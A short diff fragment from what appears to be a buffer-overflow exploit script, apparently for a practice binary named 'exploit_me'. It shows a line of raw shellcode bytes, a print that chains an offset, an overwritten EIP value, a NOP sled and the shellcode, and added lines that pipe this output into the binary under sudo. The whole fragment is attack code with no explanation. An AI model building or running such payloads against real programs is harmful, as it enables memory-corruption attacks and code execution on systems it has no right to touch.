@@ -51,3 +51,6 @@ buf += b"\x98\xf5\xd7\x1e\x30\x59\x9e\xfe\x73\xdd"
 
 
 print(offset + eip + nop + buf)
+
+run 
+sudo ./exploit_me $(python bench.py)
